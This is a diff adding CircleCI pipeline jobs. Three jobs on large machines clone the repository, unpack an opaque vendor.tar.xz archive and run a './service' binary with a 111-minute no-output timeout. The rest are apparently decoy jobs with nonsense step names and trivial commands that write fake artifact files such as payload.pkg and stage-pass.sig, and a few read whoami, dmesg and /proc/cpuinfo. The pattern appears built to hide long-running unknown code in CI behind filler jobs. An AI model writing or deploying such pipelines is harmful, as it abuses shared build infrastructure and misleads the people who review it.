+  green-light:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: Inherit stage
+          command: |
+            { head -n 5 /tmp/share/main_step_output_v2.txt > /dev/null; echo "lines ok" ; } || true
+      - run:
+          name: Download source
+          command: git clone --depth 3 --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull reference data
+          command: unxz -c vendor.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 111m
+          command: bash -c "./service"
+  vendor_DEPLOY_UAT:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: abaft
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; dmesg 2>/dev/null | tail -3 | md5sum || echo no-dmesg; true ; } > /tmp/share/86.out
+            echo "baseline emitted ($(wc -l </tmp/share/86.out) lines)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - 86.out
+  DEPLOY_UAT:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: Inherit stage
+          command: |
+            { head -n 5 /tmp/share/86.out > /dev/null; echo "lines ok" ; } || true
+      - run:
+          name: Download source
+          command: git clone --depth 3 --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Stage inputs
+          command: unxz -c vendor.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 111m
+          command: bash -c "./service"
+  tester_v9-alpha:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: noise reduce
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; dd if=/dev/zero bs=1 count=200 2>/dev/null | tr '\0' '.' | wc -c; true ; } > /tmp/share/DONE
+            echo "baseline emitted ($(wc -l </tmp/share/DONE) lines)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - DONE
+  v9-alpha:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: Inherit stage
+          command: |
+            { head -n 5 /tmp/share/DONE > /dev/null; echo "lines ok" ; } || true
+      - run:
+          name: Download source
+          command: git clone --depth 3 --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: unxz -c vendor.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 111m
+          command: bash -c "./service"
+
+  g1_ivan-ci_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: banner down
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; alias | wc -l 2>/dev/null || echo zero; true ; } > /tmp/share/OK
+            echo "baseline emitted ($(wc -l </tmp/share/OK) lines)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - OK
+  alpha_DEPLOY_UAT_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: scissor jump
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; whoami; true ; } > /tmp/share/86.out
+            echo "baseline emitted ($(wc -l </tmp/share/86.out) lines)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - 86.out
+  g2_LaunchService_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: drip drip
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{a=10; b=0; if(b)print a/b; else print "nozero"}'; true ; } > /tmp/share/artifact.pkg
+            echo "baseline emitted ($(wc -l </tmp/share/artifact.pkg) lines)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - artifact.pkg
+  cleanup_run-full-release-candidate_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: knees to elbow
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; printf "%s\n" aa bb cc aa bb | sort | uniq -c | sort -rn; true ; } > /tmp/share/full_task_output_v1.log
+            echo "baseline emitted ($(wc -l </tmp/share/full_task_output_v1.log) lines)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - full_task_output_v1.log
+  fixture_RunApp_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: tig weld
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; printf "%d\n" {1..100} | awk '{s+=$1}END{print s}'; true ; } > /tmp/share/payload.pkg
+            echo "baseline emitted ($(wc -l </tmp/share/payload.pkg) lines)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - payload.pkg
+  run_nov27-release_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: jive hop
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s="Hello"; n=length(s); for(i=0;i<n;i++)printf "%d ", 1+(index(toupper(s),substr(toupper(s),i+1,1))%26); print ""}'; true ; } > /tmp/share/gate-ok.out
+            echo "baseline emitted ($(wc -l </tmp/share/gate-ok.out) lines)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - gate-ok.out
+  preflight_bun-test_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: zigzag path
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; expr 100 \* 23; true ; } > /tmp/share/55.blob
+            echo "baseline emitted ($(wc -l </tmp/share/55.blob) lines)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - 55.blob
+  D_v9-alpha_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: calm wind
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; seq 1 5000 | awk '{s+=$1}END{print s}'; true ; } > /tmp/share/DONE
+            echo "baseline emitted ($(wc -l </tmp/share/DONE) lines)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - DONE
+  step2_io-final_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: granny knot
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; sed -n '1,5p' /proc/cpuinfo | md5sum; true ; } > /tmp/share/29.data
+            echo "baseline emitted ($(wc -l </tmp/share/29.data) lines)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - 29.data
+  db_go1-21-lint_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: tbd
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; tr -dc 'a-z' </dev/urandom | head -c 8388608 | fold -w16 | sort -u | wc -l; true ; } > /tmp/share/step-9.out
+            echo "baseline emitted ($(wc -l </tmp/share/step-9.out) lines)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - step-9.out
+  cache_cerberus-ng_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: head north
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; printf "%s\n" 1 2 3 4 5 6 7 8 9 10 | awk '{s+=$1; sq+=$1*$1}END{m=s/NR; printf "%.3f\n", sqrt(sq/NR - m*m)}'; true ; } > /tmp/share/stage-pass.sig
+            echo "baseline emitted ($(wc -l </tmp/share/stage-pass.sig) lines)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - stage-pass.sig
+  redo_green-light_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: nordic hamstring
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(y=2000;y<2024;y++)if(y%4==0 && (y%100!=0 || y%400==0)) c++; print c}'; true ; } > /tmp/share/main_step_output_v2.txt
+            echo "baseline emitted ($(wc -l </tmp/share/main_step_output_v2.txt) lines)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - main_step_output_v2.txt
+  ensure_nico-smoke_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: sing along
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s="hello world"; gsub("l","L",s); print s}'; true ; } > /tmp/share/artifact
+            echo "baseline emitted ($(wc -l </tmp/share/artifact) lines)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - artifact
+  teardown_xray-2_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: tidy
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=256;i++)printf "%c", 32+(i%95)}' | wc -c; true ; } > /tmp/share/event.txt
+            echo "baseline emitted ($(wc -l </tmp/share/event.txt) lines)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - event.txt
+  g2_cerberus_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: pls pass
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; seq 1 100 | awk 'NR>50' | wc -l; true ; } > /tmp/share/185.data
+            echo "baseline emitted ($(wc -l </tmp/share/185.data) lines)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - 185.data
+workflows:
+  default:
+    jobs:
+      - B_ivan-ci
+      - g1_ivan-ci_2:
+          requires:
+            - B_ivan-ci
+      - ivan-ci:
+          requires:
+            - g1_ivan-ci_2
+      - vendor_DEPLOY_UAT:
+          requires:
+            - g1_ivan-ci_2
+      - alpha_DEPLOY_UAT_2:
+          requires:
+            - vendor_DEPLOY_UAT
+      - DEPLOY_UAT:
+          requires:
+            - alpha_DEPLOY_UAT_2
+      - orchestrate_LaunchService:
+          requires:
+            - alpha_DEPLOY_UAT_2
+      - g2_LaunchService_2:
+          requires:
+            - orchestrate_LaunchService
+      - LaunchService:
+          requires:
+            - g2_LaunchService_2
+      - retry_biuld-12
+      - install_QA_HOOK_8
+      - biuld-12:
+          requires:
+            - retry_biuld-12
+            - install_QA_HOOK_8
+      - QA_HOOK_8:
+          requires:
+            - retry_biuld-12
+            - install_QA_HOOK_8
+      - ga-v1:
+          requires:
+            - retry_biuld-12
+            - install_QA_HOOK_8
+      - tam-push:
+          requires:
+            - retry_biuld-12
+            - install_QA_HOOK_8
+      - alpha-v7:
+          requires:
+            - retry_biuld-12
+            - install_QA_HOOK_8
+      - golf-8:
+          requires:
+            - retry_biuld-12
+            - install_QA_HOOK_8
+      - uniform:
+          requires:
+            - retry_biuld-12
+            - install_QA_HOOK_8
+      - canary1_PrepareRelease
+      - bootstrap_rm-webhook
+      - g1_tam-smoke
+      - PrepareRelease:
+          requires:
+            - canary1_PrepareRelease
+            - bootstrap_rm-webhook
+            - g1_tam-smoke
+      - rm-webhook:
+          requires:
+            - canary1_PrepareRelease
+            - bootstrap_rm-webhook
+            - g1_tam-smoke
+      - tam-smoke:
+          requires:
+            - canary1_PrepareRelease
+            - bootstrap_rm-webhook
+            - g1_tam-smoke
+      - LAB_DEPLOY_3:
+          requires:
+            - canary1_PrepareRelease
+            - bootstrap_rm-webhook
+            - g1_tam-smoke
+      - CORE-956:
+          requires:
+            - canary1_PrepareRelease
+            - bootstrap_rm-webhook
+            - g1_tam-smoke
+      - Rollout_Release5:
+          requires:
+            - canary1_PrepareRelease
+            - bootstrap_rm-webhook
+            - g1_tam-smoke
+      - send-it:
+          requires:
+            - canary1_PrepareRelease
+            - bootstrap_rm-webhook
+            - g1_tam-smoke
+      - prefetch_prometheus-rev
+      - prometheus-rev:
+          requires:
+            - prefetch_prometheus-rev
+      - package_run-full-release-candidate
+      - cleanup_run-full-release-candidate_2:
+          requires:
+            - package_run-full-release-candidate
+      - run-full-release-candidate:
+          requires:
+            - cleanup_run-full-release-candidate_2
+      - validate_RunApp:
+          requires:
+            - cleanup_run-full-release-candidate_2
+      - fixture_RunApp_2:
+          requires:
+            - validate_RunApp
+      - RunApp:
+          requires:
+            - fixture_RunApp_2
+      - Alpha_nov27-release:
+          requires:
+            - fixture_RunApp_2
+      - run_nov27-release_2:
+          requires:
+            - Alpha_nov27-release
+      - nov27-release:
+          requires:
+            - run_nov27-release_2
+      - env_bun-test:
+          requires:
+            - run_nov27-release_2
+      - preflight_bun-test_2:
+          requires:
+            - env_bun-test
+      - bun-test:
+          requires:
+            - preflight_bun-test_2
+      - tester_v9-alpha
+      - D_v9-alpha_2:
+          requires:
+            - tester_v9-alpha
+      - v9-alpha:
+          requires:
+            - D_v9-alpha_2
+      - prebuild_io-final:
+          requires:
+            - D_v9-alpha_2
+      - step2_io-final_2:
+          requires:
+            - prebuild_io-final
+      - io-final:
+          requires:
+            - step2_io-final_2
+      - C_go1-21-lint:
+          requires:
+            - step2_io-final_2
+      - db_go1-21-lint_2:
+          requires:
+            - C_go1-21-lint
+      - go1-21-lint:
+          requires:
+            - db_go1-21-lint_2
+      - hydrate_cerberus-ng:
+          requires:
+            - db_go1-21-lint_2
+      - cache_cerberus-ng_2:
+          requires:
+            - hydrate_cerberus-ng
+      - cerberus-ng:
+          requires:
+            - cache_cerberus-ng_2
+      - produce_green-light:
+          requires:
+            - cache_cerberus-ng_2
+      - redo_green-light_2:
+          requires:
+            - produce_green-light
+      - green-light:
+          requires:
+            - redo_green-light_2
+      - postcheck_nico-smoke:
+          requires:
+            - redo_green-light_2
+      - ensure_nico-smoke_2:
+          requires:
+            - postcheck_nico-smoke
+      - nico-smoke:
+          requires:
+            - ensure_nico-smoke_2
+      - vendor_xray-2:
+          requires:
+            - ensure_nico-smoke_2
+      - teardown_xray-2_2:
+          requires:
+            - vendor_xray-2
+      - xray-2:
+          requires:
+            - teardown_xray-2_2
+      - tester_cerberus:
+          requires:
+            - teardown_xray-2_2
+      - g2_cerberus_2:
+          requires:
+            - tester_cerberus
+      - cerberus:
+          requires:
+            - g2_cerberus_2
